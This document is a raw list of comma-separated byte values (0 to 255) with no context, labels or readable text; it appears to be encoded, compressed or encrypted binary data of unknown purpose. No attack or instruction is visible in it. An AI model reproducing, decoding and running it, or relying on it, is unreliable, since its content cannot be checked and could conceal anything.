67,77,81,14,1,135,166,15,162,77,234,123,238,162,56,65,99,19,127,74,204,27,14,9,17,128,141,140,234,55,32,52,49,97,102,52,112,67,126,117,157,193,135,124,85,159,50,202,128,44,123,96,119,62,162,175,161,60,51,41,217,212,147,65,75,102,196,172,201,169,231,98,71,42,250,190,188,171,241,168,253,135,134,88,91,28,90,27,76,81,187,176,205,18,170,230,252,161,49,74,3,14,227,150,28,93,27,7,93,158,177,70,162,93,118,109,241,255,42,73,37,10,32,26,135,66,15,1,68,243,137,192,166,116,112,117,103,97,97,52,49,67,1,42,155,150,128,29,31,151,52,141,132,102,122,13,215,63,166,236,237,98,96,52,134,248,208,31,23,65,177,205,214,251,246,43,4,33,166,214,239,176,169,230,169,156,203,64,1,95,93,65,18,85,168,241,6,28,169,188,171,245,43,74,71,109,225,28,65,66,27,18,1,248,231,89,64,84,124,42,226,175,102,95,36,70,37,155,140,11,95,81,75,146,139,129,239,116,34,62,40,61,106,111,55,91,31,175,132,209,199,112,71,159,123,193,213,39,47,125,222,43,164,182,183,37,114,116,219,164,192,57,89,25,176,133,212,235,88,43,92,122,160,178,161,180,231,170,229,237,207,92,80,19,9,11,23,83,86,163,73,5,250,178,188,235,101,27,10,48,254,95,27,91,23,100,0,146,229,15,90,15,108,119,174,251,38,99,117,32,120,192,154,82,89,65,83,214,211,148,101,124,51,60,36,51,54,41,96,33,44,255,202,149,157,51,21,129,109,150,17,58,106,98,152,43,229,251,177,110,38,238,139,160,214,10,87,23,210,195,23,187,85,107,20,104,250,160,173,170,189,144,191,225,212,84,18,89,16,19,10,20,88,176,77,20,241,243,238,235,43,54,10,117,190,90,60,88,65,11,18,158,151,70,10,62,32,107,226,254,42,45,55,125,43,192,218,66,2,90,17,132,196,140,123,124,46,105,122,122,106,108,107,43,112,174,136,141,157,110,83,249,140,200,82,60,99,33,215,55,179,236,170,126,42,177,197,160,241,19,18,86,131,142,77,165,23,32,19,42,182,178,163,186,241,230,239,246,215,84,26,85,8,92,6,72,29,170,11,21,188,243,246,59,49,43,22,43,188,94,26,78,85,83,147,140,142,24,54,62,34,43,226,245,119,109,62,98,101,199,135,13,31,68,128,139,141,145,40,55,51,98,56,32,17,122,55,97,49,174,202,207,154,112,196,196,192,139,20,58,47,96,222,51,161,183,170,111,99,236,157,166,139,2,6,91,208,153,28,225,5,106,84,45,237,187,204,166,191,188,243,172,222,64,28,66,17,1,92,73,23,220,94,15,230,135,250,123,40,33,16,106,228,72,10,26,127,20,129,151,138,24,82,79,60,118,250,50,114,26,33,115,43,133,148,13,111,93,150,128,153,152,38,125,58,59,36,248,98,40,118,115,59,171,193,199,220,107,220,211,222,203,55,43,5,44,195,164,171,224,161,116,13,246,199,163,192,64,65,23,139,190,10,186,113,48,4,249,244,246,239,186,241,224,169,248,210,6,17,95,80,10,29,81,76,181,55,28,248,170,226,34,115,119,91,55,247,10,79,28,104,22,128,202,153,79,120,9,32,159,171,39,49,119,118,42,42,221,58,16,113,68,212,158,129,218,105,58,46,202,106,230,57,47,118,21,55,244,134,198,178,107,200,193,228,205,8,104,109,10,215,188,225,252,252,105,101,227,134,161,110,27,27,77,194,193,78,160,23,32,10,233,224,162,228,237,210,144,238,183,89,6,2,21,25,87,16,9,80,179,22,147,188,250,196,50,127,89,65,38,108,42,74,93,46,20,128,151,213,69,16,35,108,133,234,115,105,43,37,112,105,152,123,83,111,70,218,128,154,209,113,192,59,212,63,251,123,109,7,123,114,233,224,138,178,62,219,176,151,209,17,95,33,12,192,189,166,183,170,115,114,238,188,162,74,26,26,77,161,196,87,253,23,7,79,233,166,238,255,186,224,166,191,224,69,22,64,13,92,11,92,83,79,30,6,157,228,227,230,58,42,56,3,108,125,0,67,71,112,15,245,151,151,31,16,35,124,151,226,96,119,33,59,36,234,133,123,66,25,91,177,129,133,22,14,202,96,138,106,180,19,117,44,96,170,174,241,147,174,110,138,129,220,155,12,15,118,22,152,252,250,191,176,118,161,212,234,191,28,113,14,86,208,217,82,87,14,5,14,171,244,162,245,184,49,225,254,183,42,27,23,1,107,6,64,4,84,64,7,211,228,177,249,62,49,111,124,124,57,7,37,12,52,95,218,204,204,83,65,48,46,155,176,61,42,113,101,32,190,156,119,0,37,80,212,217,207,14,105,195,59,216,59,215,49,57,39,96,231,255,172,155,252,124,218,199,198,30,5,10,37,30,219,252,241,246,68,32,228,232,187,163,8,90,104,91,128,17,28,80,89,87,21,250,182,174,190,160,40,250,181,248,69,93,80,25,26,214,82,85,0,64,94,157,167,170,249,42,121,33,43,124,106,72,81,92,37,208,209,200,151,18,92,43,60,151,226,123,103,58,101,50,223,155,119,84,110,90,221,140,158,11,103,198,49,128,100,189,113,9,39,49,240,189,160,131,173,112,144,214,199,92,5,12,55,12,133,168,179,200,5,32,251,234,156,254,90,70,2,165,203,83,77,56,23,11,9,160,187,250,77,190,118,141,237,233,27,65,16,47,0,198,94,94,84,7,28,149,254,247,116,34,33,113,122,102,63,91,80,12,100,136,203,156,153,85,70,97,63,159,123,21,102,119,39,33,190,137,126,74,109,197,134,130,158,18,39,144,107,208,186,165,48,57,41,39,234,242,184,169,230,229,208,208,130,11,12,64,49,81,207,168,247,236,93,46,160,188,249,226,29,65,75,249,219,74,94,64,7,64,8,171,91,181,5,160,57,251,228,186,73,54,86,116,77,148,0,31,81,69,57,133,192,170,33,112,72,89,63,62,116,70,81,103,52,136,215,218,214,31,94,106,144,207,42,96,44,108,39,34,173,133,37,99,113,221,155,197,159,12,96,157,50,216,252,166,43,14,122,100,161,239,224,241,246,165,156,219,140,18,13,11,59,22,78,234,228,162,15,55,234,247,161,127,16,13,2,247,206,65,80,38,82,0,134,187,91,162,8,168,41,176,227,240,61,59,17,105,1,148,70,77,88,71,139,206,197,239,120,123,37,113,61,43,110,97,75,43,100,198,131,142,138,71,82,97,152,192,126,43,110,107,55,118,175,171,126,62,107,175,135,144,153,11,61,155,197,128,239,245,46,40,122,16,187,164,170,160,241,229,135,140,194,80,14,11,29,7,18,166,171,231,16,77,253,242,228,61,4,10,109,255,144,17,28,75,18,116,221,229,5,187,119,215,46,224,170,104,29,63,21,114,0,130,70,95,81,91,219,133,250,251,61,102,45,125,103,32,63,105,82,126,79,204,128,218,193,71,199,47,184,151,123,127,58,121,117,191,174,216,111,96,111,145,134,130,133,92,86,198,136,202,161,250,46,47,104,115,161,161,184,179,172,237,223,145,206,26,68,14,94,18,26,239,236,174,11,107,255,182,235,61,80,76,86,190,141,69,95,16,69,28,146,231,53,176,74,231,42,244,162,112,29,111,11,40,8,192,68,77,1,7,129,207,192,161,102,33,111,36,51,32,101,120,79,126,60,218,218,134,116,75,156,108,215,132,104,100,39,192,104,186,171,172,99,123,116,201,212,142,81,13,65,218,213,154,179,246,110,127,43,228,161,173,184,253,235,235,217,129,66,18,107,87,92,88,93,166,163,246,10,230,231,172,176,61,74,3,28,247,98,17,93,73,17,91,205,187,21,198,93,58,46,226,249,118,65,57,18,61,29,131,80,65,88,1,243,211,145,227,103,59,36,58,103,111,41,106,75,114,50,218,131,204,40,75,193,48,217,210,100,60,15,222,43,252,173,252,100,126,63,221,163,130,5,22,23,192,205,216,235,189,58,82,113,244,188,249,250,179,236,244,240,205,54,26,65,16,31,70,93,251,179,77,94,250,225,238,238,110,25,19,71,225,64,28,92,28,100,18,158,233,68,29,93,117,97,236,164,126,0,55,16,49,221,156,81,68,45,65,139,145,152,10,108,109,106,53,58,32,63,107,36,118,177,218,211,193,36,31,135,43,141,133,121,42,58,131,107,164,190,161,53,32,172,197,187,142,71,23,85,138,220,202,235,15,113,17,127,189,164,173,146,170,176,177,225,212,65,5,66,17,5,15,81,23,176,78,14,186,188,170,228,46,29,17,65,228,72,83,66,74,99,80,135,193,125,71,5,46,97,250,168,55,73,39,112,37,192,221,85,91,70,69,131,148,202,49,38,68,112,36,124,114,45,58,125,60,179,154,215,204,124,78,221,106,154,17,48,111,122,182,67,245,170,252,34,107,240,141,183,155,90,13,91,149,223,74,235,91,108,15,122,248,160,173,176,225,251,241,248,138,126,92,30,24,86,92,76,11,181,82,20,161,225,161,176,46,92,65,46,231,65,1,91,59,20,70,216,139,71,69,15,46,32,173,225,105,119,57,96,116,135,154,66,87,10,74,219,131,144,32,48,53,33,49,32,96,127,120,107,112,243,154,204,157,111,2,194,199,213,20,97,109,60,131,39,187,171,251,116,42,183,209,183,224,19,30,15,203,149,74,224,30,119,29,100,244,187,181,186,161,227,238,189,141,21,93,65,71,27,82,83,86,241,12,94,255,251,167,125,61,93,87,119,190,90,26,11,22,69,132,143,140,94,51,85,124,46,234,39,49,119,34,32,47,128,221,76,68,10,134,138,154,204,123,54,67,93,40,58,114,63,112,58,60,189,235,141,157,51,156,202,206,208,85,60,99,60,193,117,186,250,225,110,114,235,218,250,192,65,71,123,154,205,63,186,25,98,21,96,189,195,190,188,166,160,243,244,195,12,7,30,74,1,16,20,88,244,94,95,228,134,175,125,127,108,15,118,247,72,70,28,48,78,203,204,230,87,94,83,118,133,163,59,104,52,55,96,46,133,204,75,115,93,145,158,132,145,123,125,63,35,40,163,102,109,110,96,126,255,218,144,178,114,156,219,214,144,12,97,55,124,194,240,225,166,248,118,97,254,227,183,195,29,76,91,141,222,94,230,67,45,19,229,187,183,190,185,191,242,165,244,155,67,14,31,16,90,90,18,26,182,28,148,169,160,167,96,127,108,22,62,247,7,17,1,121,30,218,158,138,87,82,15,108,134,160,103,63,106,99,40,61,156,48,66,115,80,212,139,204,150,105,96,96,202,33,166,49,109,12,102,42,248,238,215,170,51,221,198,192,213,9,122,122,23,158,191,161,185,170,111,103,254,201,239,90,27,77,1,232,136,77,202,85,10,84,229,172,170,164,176,164,254,234,244,73,65,2,1,90,81,120,93,20,237,94,142,251,237,172,50,42,52,13,106,111,70,67,87,52,30,131,140,140,69,71,55,103,135,238,49,112,109,59,33,168,209,37,36,110,93,216,138,141,152,103,149,44,155,122,163,23,122,106,115,60,175,252,145,178,112,200,223,206,208,82,16,0,74,219,168,252,187,248,103,32,237,182,164,65,3,79,75,141,193,87,81,85,26,19,195,186,196,191,231,250,230,137,241,18,66,20,21,80,19,82,14,22,17,6,157,186,130,253,59,111,44,32,55,105,9,27,90,110,18,134,204,142,71,71,109,55,213,241,115,44,109,121,50,252,203,35,82,125,16,193,198,129,12,61,194,112,128,60,188,59,34,49,33,163,180,234,131,190,53,218,150,140,5,88,15,107,74,219,189,252,207,218,51,251,170,236,245,8,19,6,25,211,222,82,11,27,7,8,173,226,225,173,252,97,188,225,225,43,90,100,66,8,81,16,67,73,90,12,143,170,237,255,38,60,43,107,106,125,90,1,1,50,14,193,157,138,71,90,113,124,133,157,50,112,43,52,60,190,203,100,7,125,95,216,138,155,6,39,192,59,154,122,180,48,34,127,33,178,242,184,143,166,29,219,211,129,3,9,20,111,30,196,177,191,183,20,107,181,188,235,191,21,26,0,16,128,20,72,27,23,74,20,187,166,183,15,224,45,234,237,237,91,84,24,5,4,204,94,31,86,28,78,197,142,227,172,35,63,33,124,113,125,95,90,11,126,154,147,152,214,71,6,49,46,151,241,106,58,43,53,112,209,221,35,84,87,208,150,144,129,30,50,197,44,140,48,246,108,116,123,43,240,255,241,198,240,40,172,129,135,0,14,50,99,10,196,177,251,188,20,113,186,172,234,245,8,0,0,181,128,68,80,73,15,11,94,233,244,162,81,164,44,229,161,210,65,67,20,101,31,235,92,4,0,7,77,201,251,240,124,42,62,108,125,41,125,13,79,60,44,218,132,214,214,21,49,112,46,135,122,103,110,45,69,106,172,137,119,86,50,222,155,140,131,95,97,128,34,203,224,162,114,99,104,127,178,170,184,193,178,241,138,210,221,90,17,20,107,91,85,187,234,184,99,122,243,212,245,175,27,22,92,181,208,64,77,80,14,18,17,173,64,171,69,234,88,188,254,170,6,37,80,61,65,157,6,15,75,66,28,201,136,240,58,102,61,119,25,62,125,70,67,13,47,153,220,142,142,31,68,43,203,143,104,39,103,121,43,39,178,156,53,42,47,139,194,227,152,30,44,134,222,208,235,188,44,109,42,35,188,169,172,250,172,224,196,138,192,91,10,24,111,92,15,166,247,250,76,63,177,187,176,52,8,81,90,247,212,68,67,13,6,0,138,250,5,224,79,188,32,170,237,38,69,62,2,61,92,131,55,92,10,17,221,223,129,170,54,112,63,112,102,39,27,116,84,100,42,221,155,193,219,71,154,97,205,158,125,125,126,45,65,34,178,219,53,114,116,141,212,130,196,70,120,180,153,242,161,253,1,63,122,123,234,228,176,255,178,169,209,219,156,6,79,8,1,92,77,168,197,252,28,103,178,172,161,46,80,3,14,228,194,7,94,81,11,26,202,255,89,162,84,224,120,234,254,60,0,59,14,111,26,135,2,68,81,50,208,145,221,250,97,112,45,41,124,122,63,58,90,118,37,155,219,219,110,81,192,123,184,155,60,110,98,121,52,241,172,181,126,98,111,208,212,199,153,87,13,195,174,212,169,158,39,126,104,229,161,191,169,165,168,241,196,167,194,3,95,9,113,30,83,201,163,162,93,40,167,226,182,101,79,3,36,251,154,0,71,1,66,11,215,138,91,224,79,234,53,171,254,114,73,99,64,120,110,152,85,8,10,17,244,183,218,130,120,50,117,62,107,126,110,107,34,107,100,219,220,199,111,78,202,48,158,222,42,61,121,219,39,160,168,216,127,37,105,201,205,140,25,9,77,222,149,171,161,252,98,84,39,228,252,245,173,179,234,239,200,207,71,91,26,13,31,18,15,168,163,166,18,167,161,188,236,111,71,3,76,229,68,17,2,65,85,93,141,253,3,186,74,46,53,226,253,38,99,42,2,54,6,215,25,92,90,91,241,138,211,241,122,54,63,97,35,96,41,106,80,118,47,156,138,204,110,38,211,119,217,159,112,111,110,207,52,199,235,161,53,101,125,219,165,144,4,22,86,207,220,216,169,186,107,95,112,231,190,227,177,167,190,181,236,195,22,0,13,64,64,7,93,160,175,75,16,228,224,252,181,61,120,68,55,249,7,93,26,64,7,30,209,167,68,16,84,97,41,251,249,60,42,120,90,44,135,214,80,2,72,64,146,143,136,127,96,42,127,106,61,32,111,105,12,118,168,154,207,239,86,87,201,70,202,195,121,33,110,158,127,174,240,252,62,38,236,197,228,138,27,18,86,219,149,154,230,7,119,82,36,222,215,235,165,252,227,188,244,151,28,94,1,0,4,30,20,80,234,72,12,230,224,188,249,61,92,26,43,231,10,69,29,65,11,5,136,214,69,64,85,46,43,170,191,126,17,99,58,46,128,219,0,95,72,91,215,152,204,105,44,44,37,56,39,124,125,55,101,105,179,218,204,142,111,79,199,49,150,73,123,115,38,215,51,179,178,235,40,126,237,201,164,214,81,22,25,220,149,17,230,23,98,81,1,167,178,173,180,225,242,159,241,209,29,84,3,17,31,0,9,14,251,63,5,230,255,252,236,51,40,98,48,190,44,121,78,13,9,220,158,141,91,67,27,56,97,234,136,119,83,62,58,115,221,148,26,84,72,95,128,129,202,105,59,107,63,60,25,122,99,120,127,60,189,129,150,142,109,85,223,196,150,8,102,117,44,215,39,179,184,181,115,59,230,145,242,144,57,76,11,206,216,10,235,25,122,95,124,231,251,163,164,241,160,233,232,135,76,18,39,6,0,94,73,26,175,77,28,232,167,238,50,51,71,20,42,190,70,55,93,65,69,147,134,141,68,23,15,111,44,243,49,114,121,37,102,44,221,148,11,65,72,220,209,167,215,67,61,68,33,124,186,114,34,97,60,126,189,204,219,142,106,183,199,150,144,20,121,113,110,149,52,225,191,251,105,124,247,201,248,130,75,90,0,214,140,94,131,31,117,29,33,225,186,163,186,231,254,228,248,160,84,80,27,17,19,29,79,88,171,94,125,161,246,188,62,46,108,64,39,226,72,90,26,45,23,209,150,203,3,71,20,46,195,171,96,10,105,33,123,94,209,152,32,37,28,156,146,158,215,61,38,59,52,59,180,59,117,58,115,112,244,157,149,173,108,164,154,140,217,20,43,106,125,158,168,161,253,183,116,32,186,216,190,92,19,0,13,209,195,29,186,5,43,13,172,236,176,226,188,164,187,176,224,212,90,77,13,8,71,74,68,86,234,76,145,250,172,167,50,61,96,76,112,254,90,75,26,110,14,129,137,251,4,82,97,54,222,172,125,55,6,111,81,114,128,59,0,104,10,216,128,193,144,105,96,46,207,73,167,42,33,116,50,126,234,180,141,241,52,196,194,199,201,79,121,55,30,219,252,240,174,183,107,54,254,193,245,8,81,92,8,219,132,94,251,31,80,4,150,253,177,203,191,163,234,238,181,73,6,12,89,71,75,82,73,29,95,94,201,224,161,238,50,43,113,10,108,47,16,10,64,41,120,154,204,149,24,6,45,59,138,238,107,48,45,47,123,166,137,56,66,125,93,198,221,141,140,97,216,46,154,40,251,98,122,48,58,161,181,170,147,234,117,135,193,156,217,12,24,113,14,195,186,225,216,225,5,102,232,191,244,74,1,14,9,194,221,79,78,14,93,14,248,252,177,173,168,164,254,181,238,27,70,114,89,28,19,82,5,64,29,77,223,228,177,231,60,127,96,32,54,125,95,1,83,46,7,135,198,239,94,16,119,34,195,240,115,118,56,62,50,183,209,97,66,51,16,221,139,207,7,59,219,118,138,108,172,97,120,27,127,230,244,162,146,236,46,196,129,199,3,83,16,55,30,153,225,164,174,173,63,235,238,234,211,8,75,104,13,194,17,6,11,67,30,4,160,182,193,206,224,49,187,229,244,10,22,2,31,16,65,70,31,73,68,23,133,253,244,171,50,59,119,59,54,50,16,84,49,60,15,131,193,128,31,27,103,34,128,164,50,108,117,68,62,173,159,119,26,87,91,128,228,242,81,127,202,59,138,56,230,97,27,41,96,190,164,184,202,190,36,196,212,206,2,15,20,44,95,196,176,162,189,89,63,235,242,187,209,28,11,65,88,214,95,87,26,7,80,19,251,244,186,85,160,44,141,254,186,64,12,2,95,27,148,75,15,20,65,16,131,224,166,109,32,63,108,35,39,60,93,17,78,47,155,154,214,136,80,65,108,103,207,160,123,96,43,43,59,234,129,111,66,51,193,218,147,213,16,123,128,34,148,112,184,108,101,122,49,178,175,176,149,190,112,218,151,218,27,82,24,47,30,149,234,239,253,79,53,255,183,187,242,74,19,94,147,128,67,79,63,30,65,15,250,95,246,34,161,40,242,164,210,90,6,64,89,26,133,69,94,31,83,12,147,138,250,99,36,57,48,32,106,104,55,90,38,22,145,220,203,141,81,65,119,111,213,104,125,120,109,63,32,168,209,56,126,52,217,150,151,223,18,120,197,34,208,235,166,112,34,38,49,178,180,252,144,230,180,138,219,157,1,69,64,58,30,5,252,179,188,72,46,243,172,161,165,26,124,76,190,209,68,79,1,82,18,84,166,94,237,93,166,57,239,189,225,90,126,12,113,74,131,92,94,88,64,76,213,212,250,98,96,127,46,51,119,50,32,33,63,94,208,147,142,252,21,16,58,203,222,58,115,44,113,39,112,234,137,127,106,110,155,140,192,129,22,39,128,223,204,161,231,118,97,122,89,178,239,161,213,168,241,187,211,177,18,19,24,0,23,15,187,171,236,5,126,224,254,161,47,16,74,0,190,213,27,72,23,85,0,151,250,87,172,9,186,125,148,237,108,69,101,75,49,1,148,10,1,17,28,146,142,145,239,98,58,63,112,81,127,115,116,1,107,104,136,147,142,149,5,156,119,217,132,58,60,44,104,101,64,234,223,123,122,63,192,194,199,132,16,11,210,132,150,187,250,108,40,42,96,190,229,177,241,220,239,144,210,220,30,105,64,27,76,31,186,181,190,68,103,177,167,141,61,6,13,29,247,218,121,116,85,15,93,139,168,25,231,93,252,117,173,250,60,11,111,17,114,90,198,0,95,68,1,155,212,215,239,116,50,127,40,103,16,63,32,23,49,117,219,223,142,53,80,145,42,193,131,12,97,127,112,41,204,252,160,111,114,37,128,145,159,129,87,17,193,197,212,196,213,98,126,112,250,190,254,241,179,176,235,129,202,222,18,30,13,75,13,78,250,163,183,72,188,144,161,183,116,8,41,26,228,128,64,0,77,7,115,146,251,51,235,75,224,43,186,175,109,69,59,17,47,8,135,0,1,90,7,146,210,152,183,116,86,57,57,61,61,113,49,27,105,48,136,141,150,111,83,154,97,215,213,42,12,98,206,101,160,183,183,96,49,125,139,192,142,11,12,115,222,131,209,253,180,98,20,127,231,161,191,234,235,247,164,220,151,84,0,26,87,112,12,84,168,137,188,21,232,177,238,233,47,109,103,65,251,28,69,78,80,84,70,140,166,71,240,62,121,118,240,175,63,11,47,23,49,133,198,76,31,65,67,146,217,218,241,58,34,60,124,76,106,52,25,74,109,41,193,145,157,62,19,150,43,144,151,42,106,24,197,43,162,176,168,119,114,49,134,163,214,29,11,86,210,149,193,236,67,48,95,100,253,171,249,171,160,242,169,183,208,71,4,89,87,19,97,78,160,177,76,16,232,229,167,235,49,8,3,45,255,10,68,70,89,67,27,137,249,91,0,81,124,55,244,164,108,71,55,77,42,198,130,84,1,72,83,138,147,143,101,100,113,63,103,58,122,115,105,77,107,189,134,202,158,47,84,198,113,207,11,13,55,44,194,102,245,234,176,123,32,227,155,245,203,92,12,74,198,197,208,160,94,32,10,60,176,234,164,184,170,230,253,180,215,55,70,108,20,19,7,83,80,234,10,83,230,144,186,238,105,122,70,45,229,41,95,66,27,69,70,146,151,21,0,76,34,55,157,168,55,17,83,106,47,137,141,91,92,93,91,240,157,192,120,38,122,45,123,37,114,50,97,121,107,255,220,131,135,104,21,211,97,203,9,100,99,39,215,63,153,234,246,116,32,254,222,174,146,75,74,17,210,140,59,253,30,110,5,42,181,240,184,184,231,254,238,233,138,27,30,21,11,81,120,31,75,241,80,122,188,234,182,161,49,49,26,50,234,27,65,91,115,19,131,142,145,67,74,81,46,57,226,175,42,33,62,62,51,221,218,66,69,68,193,154,129,215,67,97,49,53,48,51,99,57,107,49,49,171,220,211,128,117,84,159,206,150,120,96,123,60,196,39,231,252,183,107,48,188,201,227,149,19,16,8,232,130,77,165,7,122,21,43,244,161,255,240,164,228,244,246,219,84,80,3,29,81,79,15,88,241,76,16,176,253,141,102,49,42,3,112,230,72,64,70,52,120,134,220,203,21,82,75,63,118,241,97,109,48,111,102,122,203,198,80,95,81,198,133,154,222,61,61,50,61,57,251,52,124,112,115,107,189,252,131,159,112,218,202,219,141,17,66,99,54,206,186,160,185,225,43,61,236,197,187,203,2,7,21,209,223,82,165,23,33,11,100,224,241,163,191,241,167,191,240,195,88,64,89,28,0,65,83,84,241,94,72,224,227,224,59,40,125,30,102,224,72,17,12,47,7,220,134,216,87,65,72,122,159,241,39,60,97,29,123,45,155,133,16,113,92,194,155,156,148,49,54,122,128,40,164,100,47,106,43,105,189,134,193,193,62,193,193,194,209,14,42,99,98,152,187,187,225,183,107,123,172,201,254,6,10,30,65,210,213,10,235,13,118,11,160,227,182,161,177,163,242,239,225,26,22,80,3,8,29,90,74,88,226,86,141,241,161,238,38,40,56,26,38,238,59,77,26,60,20,208,141,193,87,66,48,39,216,160,49,126,106,117,38,49,209,47,11,37,94,212,156,159,202,105,109,49,216,120,213,98,109,29,43,114,177,224,193,248,111,169,197,217,200,84,39,107,7,199,250,227,174,170,119,106,236,235,246,0,31,29,21,210,197,94,186,1,93,14,252,189,183,245,234,160,187,180,246,27,12,16,13,29,7,16,19,23,7,33,149,250,227,230,50,61,56,11,46,116,26,75,86,48,120,135,215,145,2,66,123,122,151,182,43,49,63,55,106,241,198,110,4,50,81,201,192,223,142,105,134,96,216,106,180,48,127,120,97,240,229,182,154,169,124,220,192,175,192,15,76,106,30,223,168,250,231,251,103,96,188,164,162,77,65,14,77,194,223,77,115,4,97,95,170,244,174,165,161,189,224,254,240,71,84,17,66,76,31,27,4,73,17,79,223,241,227,254,106,52,52,35,50,111,65,67,92,37,69,220,223,138,31,64,106,107,135,250,96,44,119,101,125,230,192,18,66,125,88,151,202,133,14,43,138,46,204,40,241,123,53,33,127,160,177,220,143,172,114,200,211,220,92,19,20,28,30,223,166,241,236,177,103,255,230,249,187,80,11,71,77,202,67,16,13,27,30,29,225,182,168,189,225,112,234,199,160,7,93,11,30,8,19,75,1,81,11,28,157,230,133,238,32,60,52,25,47,49,95,80,78,40,83,218,134,193,19,1,62,32,141,245,122,103,58,52,125,172,198,119,12,51,1,193,209,154,76,13,197,107,212,63,186,126,36,122,58,187,189,176,209,252,62,218,209,206,0,20,64,123,30,130,177,161,246,5,116,225,233,182,183,6,7,28,254,215,95,76,58,2,91,73,141,164,235,15,168,33,189,249,160,73,71,86,85,1,133,94,103,75,67,82,148,139,177,120,59,33,47,38,62,37,94,81,70,53,199,138,142,139,71,94,55,108,217,182,127,110,121,39,33,171,156,35,1,117,134,205,195,129,30,61,157,34,206,36,189,58,127,100,123,178,233,219,204,171,239,129,129,192,30,19,126,42,82,152,231,234,225,94,47,189,247,238,187,92,1,7,251,203,64,11,1,85,5,14,160,91,177,20,185,107,252,199,171,27,29,2,53,74,152,29,67,60,66,77,212,148,172,54,43,110,43,58,50,125,72,74,60,47,199,147,218,139,71,16,47,60,211,122,98,125,105,115,32,173,234,53,100,103,219,155,205,141,12,105,144,122,202,167,236,107,36,104,123,163,175,184,131,234,229,156,210,140,26,79,90,99,70,15,230,137,186,15,43,253,150,171,165,25,17,71,238,142,83,82,11,25,7,142,224,79,246,76,252,57,189,227,246,29,72,12,105,0,199,69,2,76,95,17,143,202,245,103,81,63,43,63,124,116,106,17,119,41,136,138,142,153,5,91,65,129,129,104,125,58,121,104,96,183,161,121,102,117,201,220,149,154,30,105,199,222,154,167,160,98,100,123,97,164,244,172,187,241,184,154,195,129,18,94,11,92,112,73,166,173,237,85,20,228,236,245,105,90,16,7,187,194,83,82,16,2,83,205,168,54,171,20,234,42,151,255,109,27,91,77,95,105,192,10,15,75,75,219,148,212,227,116,42,58,18,97,32,107,116,79,49,48,136,157,150,205,5,206,119,213,143,33,96,96,121,49,60,221,185,101,32,47,128,150,144,153,7,86,193,222,208,189,251,53,29,123,97,178,191,172,250,234,241,129,209,140,5,66,81,11,70,28,240,183,184,121,103,224,172,232,105,105,70,22,147,206,71,87,89,95,28,209,172,87,172,68,168,123,236,168,49,29,99,19,52,74,141,27,84,68,11,146,132,128,237,116,43,45,56,63,124,56,120,82,126,47,202,214,199,110,5,172,45,149,210,100,89,125,113,117,186,173,177,35,114,52,221,212,192,81,8,15,197,195,207,176,224,45,97,123,160,190,181,174,186,236,169,200,214,154,93,67,95,81,74,84,190,236,162,12,230,243,186,161,124,6,3,28,181,218,26,7,81,11,30,134,231,87,177,79,32,53,176,255,105,91,101,10,61,8,156,85,65,65,1,222,249,249,245,124,37,45,58,103,97,125,101,67,31,119,153,215,154,24,75,223,35,193,130,104,122,33,206,53,250,171,248,54,20,50,201,212,155,71,30,120,195,222,154,187,245,116,79,123,177,230,228,241,171,190,244,144,155,65,5,13,123,10,77,15,161,176,77,78,167,225,238,232,101,65,13,28,181,65,70,94,81,21,80,151,166,95,174,93,124,49,226,175,108,69,57,26,114,221,209,0,2,1,7,215,157,136,177,125,46,117,61,39,97,106,120,1,44,244,157,209,199,24,14,145,35,217,240,48,111,123,193,100,179,241,234,56,42,105,218,254,142,108,87,10,210,139,216,165,27,38,123,97,231,252,173,173,179,173,243,234,138,27,64,65,87,113,16,84,72,236,82,8,189,161,238,234,49,105,18,48,181,98,95,71,80,19,4,221,251,69,66,26,61,120,186,163,60,39,117,112,127,135,156,5,69,12,90,198,140,141,105,120,42,117,57,32,114,62,32,81,18,255,208,144,157,124,86,135,108,215,17,104,112,45,133,43,179,167,181,53,101,231,219,246,146,27,81,65,203,143,87,190,85,107,8,97,160,215,232,236,161,227,178,224,214,23,0,69,103,1,76,31,81,181,94,28,230,243,238,249,47,46,74,35,224,94,26,78,11,84,0,158,145,94,92,31,46,57,176,185,84,62,57,34,91,137,214,11,65,92,16,209,217,139,43,109,49,53,32,112,39,52,58,33,118,181,198,194,194,111,6,193,222,141,29,48,107,8,153,51,191,173,181,1,97,166,155,229,192,108,30,11,196,205,77,187,79,32,9,104,248,188,249,188,208,176,228,153,215,84,115,26,11,4,64,20,22,229,6,18,169,255,253,43,61,108,18,62,226,68,65,94,28,14,220,144,203,5,51,31,55,57,171,175,111,117,101,69,66,137,141,7,15,7,196,158,217,142,97,59,34,35,40,97,97,53,96,39,109,172,156,208,130,124,132,154,219,184,10,14,33,121,152,110,163,162,181,24,97,232,220,239,149,116,18,10,128,149,94,251,23,112,95,36,189,176,161,224,161,170,190,170,214,76,64,31,25,92,64,71,26,177,94,10,225,251,186,112,116,94,21,62,238,93,7,66,47,83,133,204,145,79,82,62,97,123,176,52,119,43,55,32,105,155,135,0,101,1,216,132,141,148,127,101,118,100,49,247,38,47,58,115,105,181,204,138,157,112,222,199,135,150,29,59,99,118,217,191,166,162,235,51,124,178,201,183,192,81,0,15,203,196,94,169,25,113,83,143,253,170,249,237,153,224,178,246,202,6,27,110,77,27,0,15,74,241,42,4,228,240,252,81,127,113,66,40,225,70,75,87,47,78,129,135,219,5,75,31,97,197,182,58,45,106,59,59,117,137,148,66,110,90,220,158,141,251,124,120,58,208,36,248,48,127,112,115,44,179,129,193,182,106,138,211,135,213,73,39,115,76,198,186,248,200,172,118,42,254,201,191,106,31,14,10,143,221,6,131,2,32,12,166,228,237,254,250,244,228,179,172,7,84,19,66,0,71,52,57,22,176,71,201,186,245,230,38,45,108,19,38,48,13,81,66,47,9,157,144,205,69,16,51,96,151,186,49,60,48,117,50,41,137,53,11,125,91,198,221,129,254,123,138,48,208,33,253,32,126,58,123,109,179,169,193,183,114,138,196,206,217,29,117,54,18,219,188,170,174,237,111,96,233,161,166,8,0,71,65,194,217,10,191,4,74,12,250,250,178,180,231,189,254,175,172,29,12,78,66,0,0,82,15,79,22,75,157,170,128,254,32,66,56,27,113,125,7,77,64,46,15,200,158,149,14,49,50,32,151,238,99,43,121,117,62,178,203,96,81,24,26,216,154,202,76,40,155,55,216,102,167,38,97,104,96,243,239,168,145,173,111,193,211,130,151,15,8,106,93,149,168,235,187,237,40,225,172,161,160,1,81,76,10,154,143,10,28,4,80,73,251,187,162,173,240,179,242,245,236,81,27,2,1,80,3,90,95,75,83,28,148,250,129,249,62,46,122,51,108,63,72,79,95,46,7,129,157,255,5,0,48,32,207,226,50,1,110,110,36,173,159,62,21,52,0,212,158,131,74,103,134,118,203,112,180,114,126,97,33,186,233,184,149,174,124,200,194,218,4,14,74,33,6,176,184,235,174,